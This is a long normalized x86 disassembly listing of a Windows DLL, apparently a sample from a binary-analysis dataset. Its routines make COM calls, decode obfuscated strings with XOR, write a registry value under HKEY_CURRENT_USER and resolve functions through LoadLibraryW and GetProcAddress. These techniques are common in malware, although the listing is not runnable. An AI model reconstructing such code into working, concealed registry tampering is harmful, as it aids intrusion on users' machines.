mov esi [ ebp - 0xe8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x17c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x178 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x174 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x170 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x17c ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x164 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x144 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
lea edx [ ebp - 0x168 ]
mov eax 0x6
mov [ ebp - 0xc0 ] ebx
call sub_10044b40
lea edx [ ebp - 0xc4 ]
push edx
lea edi [ ebp - 0x168 ]
call sub_10029ba0
mov [ ebp - 0x4 ] 0x5
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax 0x1
jmp r-xdata
lea eax [ ebp - 0xc4 ]
push eax
mov edi r--data
call sub_10029ba0
mov [ ebp - 0x4 ] 0x6
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
lea edi [ ebp - 0xc0 ]
push edi
push eax
mov eax [ edx + 0x1c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_1002eb30
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xc0 ]
jmp r-xdata
mov eax [ ebp - 0xc0 ]
mov edx [ eax ]
push ebx
push ecx
push eax
mov eax [ edx + 0x3c ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1002eb30
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0xbc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov edi eax
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jge r-xdata
mov eax [ ebp - 0xc0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x28 ]
push r--data
push eax
call edx
mov edi eax
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_10029c40
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0xd8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
cmp eax ebx
jl r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x2
call sub_10044b40
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_10029ba0
mov [ ebp - 0x4 ] 0x7
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x110 ]
mov [ ebp - 0x110 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x20 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1002eb30
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x38 ]
push 0x2
push eax
call edx
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x48 ]
push 0x1
push eax
call edx
mov edi eax
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x58 ]
push 0xffffffff
push eax
call edx
mov edi eax
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x118 ]
mov [ ebp - 0x118 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x118 ]
lea edx [ ebp - 0x114 ]
push edx
mov [ ebp - 0x114 ] ebx
mov ecx [ eax ]
push 0x9
push eax
mov eax [ ecx + 0x28 ]
call eax
mov edi eax
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x114 ]
lea edx [ ebp - 0xd0 ]
push edx
mov [ ebp - 0xd0 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0x114 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x8
call sub_10044b40
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_10029ba0
mov [ ebp - 0x4 ] 0x8
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x24 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1002eb30
lea edx [ ebp - 0x74 ]
xor eax eax
call sub_10044b40
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_10029ba0
mov [ ebp - 0x4 ] 0x9
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x3c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1002eb30
lea edx [ ebp - 0x9c ]
mov eax 0x5
call sub_10044b40
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_10029ba0
mov [ ebp - 0x4 ] 0xa
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xe0 ]
mov [ ebp - 0xe0 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x44 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_1002eb30
lea edx [ ebp - 0x20 ]
mov eax 0x4
call sub_10044b40
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov edi eax
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xe0 ]
lea edx [ ebp - 0xfc ]
push edx
mov [ ebp - 0xfc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x30 ]
call eax
mov edi eax
mov eax [ ebp - 0xe0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xfc ]
lea edx [ ebp - 0xdc ]
push edx
mov [ ebp - 0xdc ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0xa4 ] 0x8
mov edi [ ebp - 0xb8 ]
jae r-xdata
lea eax [ ebp - 0xc4 ]
push eax
call sub_10029ba0
mov [ ebp - 0x4 ] 0xb
mov eax [ eax ]
cmp eax ebx
je r-xdata
lea edi [ ebp - 0xb8 ]
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0xd4 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_10029ba0
mov [ ebp - 0x4 ] 0xc
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xdc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x2c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_1002eb30
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax 0x8
push r--data
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x164 ] ax
call [ SysAllocString@IAT ]
mov [ ebp - 0x15c ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x34 ]
call eax
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_1002eb30
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0xc8 ] ebx
jl r-xdata
mov ecx [ ebp - 0x164 ]
mov edx [ ebp - 0x160 ]
mov edi [ VariantInit@IAT ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x158 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov [ ebp - 0xf0 ] edx
mov [ ebp - 0xe8 ] eax
call edi
mov eax [ ebp - 0x150 ]
mov edx [ ebp - 0x154 ]
mov ecx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x10c ] edx
mov edx [ ebp - 0x148 ]
lea eax [ ebp - 0x144 ]
push eax
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x100 ] edx
call edi
mov [ ebp - 0x4 ] 0xf
mov edx [ ebp - 0x140 ]
mov ecx [ ebp - 0x144 ]
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x12c ] ecx
mov ecx [ ebp - 0x138 ]
lea edx [ ebp - 0xd4 ]
push edx
mov edi r--data
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call sub_10029ba0
mov [ ebp - 0x4 ] 0x10
mov eax [ eax ]
cmp eax ebx
je r-xdata
push 0x8007000e
call sub_10008030
mov [ ebp - 0xc8 ] ebx
mov eax [ eax ]
mov [ ebp - 0xc8 ] eax
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
call edx
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x130 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_10029c40
xor eax eax
mov edx [ eax ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov edi [ ebp - 0xf4 ]
lea eax [ ebp - 0x130 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0xec ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0xe8 ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x10c ]
push 0x2
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x108 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x104 ]
mov ecx [ ebp - 0xc0 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x100 ]
mov edx [ ecx ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x12c ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x128 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x124 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x120 ]
mov [ eax + 0xc ] edi
mov eax [ ebp - 0xbc ]
push 0x6
push eax
mov eax [ ebp - 0xc8 ]
push eax
push ecx
mov ecx [ edx + 0x44 ]
call ecx
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
call sub_1002eb30
lea edx [ ebp - 0x144 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
mov eax [ ebp - 0xc0 ]
push eax
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
sub_1004f7a0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x3c ] 0x8
push edi
jb r-xdata
xor ecx ecx
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x28 ] cx
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x28 ]
push eax
call sub_1006591f
add esp 0x4
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_1006591f
add esp 0x4
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10050f50
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1004f840
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x214 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0xc ] ebx
je r-xdata
lea edx [ ebp - 0x10c ]
mov eax 0x90
call sub_10013830
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
push edi
cmp [ esi + 0x384 ] ebx
jne r-xdata
lea edx [ ebp - 0xf8 ]
mov eax 0xbd
call sub_10013830
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
push 0x104
mov eax 0x1
lea edx [ ebp - 0x210 ]
push ebx
push edx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x40 ] eax
call sub_10079a10
add esp 0xc
lea eax [ ebp - 0x210 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x214 ]
push ecx
push edx
lea eax [ ebp - 0x210 ]
push eax
lea edi [ esi + 0x50 ]
push esi
mov ebx edi
call sub_1000ae30
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x7c
call sub_10013830
lea edi [ ebp - 0x10 ]
mov eax 0xc5
call sub_10009000
lea edi [ ebp - 0x28 ]
mov eax 0x74
call sub_10009000
lea edi [ ebp - 0x38 ]
mov eax 0x82
call sub_10009000
lea edi [ ebp - 0x48 ]
mov eax 0xae
call sub_10009000
lea edi [ ebp - 0x1c ]
mov eax 0x11f
call sub_10009000
lea ecx [ ebp - 0x60 ]
push ecx
call [ LoadLibraryW@IAT ]
mov edi [ GetProcAddress@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ esi + 0x384 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x388 ] eax
lea eax [ ebp - 0x28 ]
push eax
push ecx
call edi
lea edx [ ebp - 0x38 ]
mov [ esi + 0x38c ] eax
mov eax [ esi + 0x384 ]
push edx
push eax
call edi
mov edx [ esi + 0x384 ]
lea ecx [ ebp - 0x48 ]
push ecx
push edx
mov [ esi + 0x390 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x394 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ecx
call edi
mov [ esi + 0x398 ] eax
cmp [ esi + 0x388 ] ebx
je r-xdata
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
push esi
push edi
mov edx [ esi + 0x388 ]
push sub_100230d0
push sub_10072550
push sub_1002ffe0
push sub_10019a80
push sub_1004d400
push sub_100284c0
push sub_10001650
push sub_100572a0
push sub_10067f80
lea ecx [ esi + 0x10 ]
push sub_1005f610
push ecx
call edx
xor ecx ecx
add esp 0x34
test eax eax
setne cl
mov [ esi + 0xc ] eax
pop edi
pop ebx
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0xac ]
mov eax 0x106
mov [ esi + 0x384 ] ebx
call sub_10013830
cmp [ esi + 0x38c ] ebx
je r-xdata
cmp [ esi + 0x390 ] ebx
je r-xdata
cmp [ esi + 0x394 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
sub_1004faa0
push ebp
mov ebp esp
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x60
and edx 0xff
mov [ ebp + eax * 2 - 0x8c ] dx
inc eax
cmp eax 0x29
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x8c ]
push edx
push 0x80000001
mov [ ebp - 0x3a ] ax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x14c
mov [ ebp - 0xf0 ] 0x4
mov [ ebp - 0xe8 ] 0x0
call sub_10013830
lea eax [ ebp - 0xf0 ]
push eax
mov eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push esi
mov esi [ RegCloseKey@IAT ]
push edx
call esi
lea edx [ ebp - 0xe0 ]
mov eax 0x93
call sub_10013830
lea eax [ ebp - 0xe4 ]
push eax
push 0x2
push 0x0
mov ecx edx
push ecx
push 0x80000001
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0xe8 ]
cmp eax 0x1
je r-xdata
mov ecx [ ebp - 0xe4 ]
push 0x4
lea edx [ ebp - 0xec ]
push edx
push 0x4
push 0x0
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov [ ebp - 0xec ] 0x1
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop esi
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xe4 ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call esi
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push edx
call esi
pop esi
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1004fc50
push ebp
mov ebp esp
push ecx
xor eax eax
push ebx
mov ebx [ esi + 0xcc ]
push edi
mov edi [ esi + 0xd0 ]
mov [ esi + 0xd5 ] ax
mov [ esi + 0xd8 ] eax
mov [ esi + 0xdc ] eax
mov [ esi + 0xe0 ] eax
lea eax [ esi + 0x94 ]
push eax
lea ecx [ esi + 0x78 ]
push ecx
lea eax [ esi + 0x5c ]
push eax
movzx eax [ esi + 0x3c ]
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea ecx [ esi + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ esi + 0xb0 ]
call sub_1002bc00
add esp 0x18
mov [ esi + 0xec ] eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
push esi
call sub_100688e0
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x0
mov eax 0x1f4
mov edi esi
mov [ esi + 0xd5 ] 0x1
call sub_10020110
push ebx
push 0x1
push esi
mov [ esi + 0xd8 ] eax
call sub_100688e0
test eax eax
jne r-xdata
mov ecx [ esi + 0xec ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
mov ecx [ esi + 0xec ]
test ecx ecx
je r-xdata
pop edi
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xd4 ] 0x1
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x1
mov eax 0x7d0
mov [ esi + 0xd6 ] 0x1
mov [ esi + 0xe0 ] 0x1
call sub_10020110
mov [ esi + 0xdc ] eax
mov [ esi + 0xec ] 0x0
mov eax 0x2
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_1004fd82
push 0x4c
mov eax sub_1007f3b5
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x3c ] al
lea eax [ ebp - 0x58 ]
push eax
mov ecx ebx
mov [ ebp - 0x30 ] edi
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005434f
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x54 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10051f6c
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
mov edi [ ebx + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x40 ] al
push [ ebp - 0x40 ]
lea eax [ ebp - 0x4c ]
push [ ebp - 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_10052557
mov ecx [ eax ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
xor esi esi
push [ ebp - 0x38 ]
mov [ ebp + 0x14 ] eax
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_1000def6
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x50 ]
call sub_1004fa89
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
cmp edi [ ebp - 0x30 ]
jbe r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x34 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_100614ea
mov ecx [ eax ]
add esi [ ebp - 0x34 ]
push edi
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
push [ eax ]
sub [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x38 ]
call sub_1000def6
add esp 0x30
push edi
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x38 ]
call sub_1000def6
add esp 0x18
jmp r-xdata
sub edi [ ebp - 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp - 0x30 ]
sub eax edi
inc eax
push eax
lea ecx [ esi + edi ]
push ecx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
mov [ ebp - 0x40 ] ecx
call sub_1003bb2a
mov eax [ ebp - 0x40 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x48 ]
add esp 0x10
inc [ ebp - 0x30 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
sub_1004ffa0
push ebp
mov ebp esp
sub esp 0xb60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xb5c ] eax
mov [ ebp - 0xb50 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0xb4c ] edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd0
and edx 0xff
mov [ ebp + eax * 2 - 0xbc ] dx
inc eax
cmp eax 0x33
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xb38 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xbc ]
push edx
push 0x80000002
mov [ ebp - 0x56 ] ax
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0xb38 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xb48 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xb38 ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x2
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xb48 ]
test eax eax
je r-xdata
push ebx
push esi
xor esi esi
mov [ ebp - 0xb3c ] esi
test eax eax
